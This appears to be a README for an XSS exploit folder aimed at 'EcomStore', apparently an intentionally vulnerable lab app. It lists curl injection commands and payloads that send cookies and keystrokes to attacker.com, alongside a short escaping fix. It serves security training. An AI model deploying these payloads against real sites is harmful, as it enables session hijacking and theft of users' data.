# EcomStore XSS Exploits

## Overview
This directory contains Cross-Site Scripting exploits for EcomStore. Product reviews and search functionality have XSS vulnerabilities.

## Target Application
- **App**: EcomStore
- **Port**: 5004
- **Vulnerability**: Reflected & Stored XSS
- **Severity**: HIGH

## Available Exploits

### 1. reflected_xss.py
**Type**: Reflected XSS in search  
**Target**: `/search?q=<payload>`

**Usage**:
```bash
# Test reflected XSS
python reflected_xss.py http://localhost:5004

# Manual test
curl "http://localhost:5004/search?q=<script>alert(1)</script>"
```

### 2. stored_xss.py
**Type**: Stored XSS in product reviews  
**Target**: `/product/<id>/review`

**Usage**:
```bash
# Inject stored XSS in review
python stored_xss.py http://localhost:5004

# Manual POST
curl -X POST http://localhost:5004/product/1/review \
  -d "review=<script>alert(document.cookie)</script>&rating=5"
```

## XSS Payloads

```html
<!-- Cookie theft -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- Session hijacking -->
<img src=x onerror="new Image().src='http://attacker.com/steal?s='+document.cookie">

<!-- Keylogger -->
<script>document.onkeypress=e=>fetch('http://attacker.com/key?k='+e.key)</script>

<!-- DOM manipulation -->
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
```

## Testing Steps

1. **Start Application**:
```bash
cd ../../projects/ecomstore
docker-compose up -d
```

2. **Test Reflected XSS**:
```bash
firefox "http://localhost:5004/search?q=<script>alert('XSS')</script>"
```

3. **Test Stored XSS**:
```bash
python stored_xss.py http://localhost:5004
firefox "http://localhost:5004/product/1"
```

## Defense

**Vulnerable**:
```python
return f"<h1>Results for: {query}</h1>"
```

**Fixed**:
```python
from markupsafe import escape
return f"<h1>Results for: {escape(query)}</h1>"
```

## Notes
Stored XSS in reviews affects all customers viewing that product.

## Related Exploits
- See `../../dsvpwa/xss/` for more XSS techniques
- See `../../chatapp/xss/` for chat-based XSS
- See `../../vulnblog/xss/` for blog XSS

## References
- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
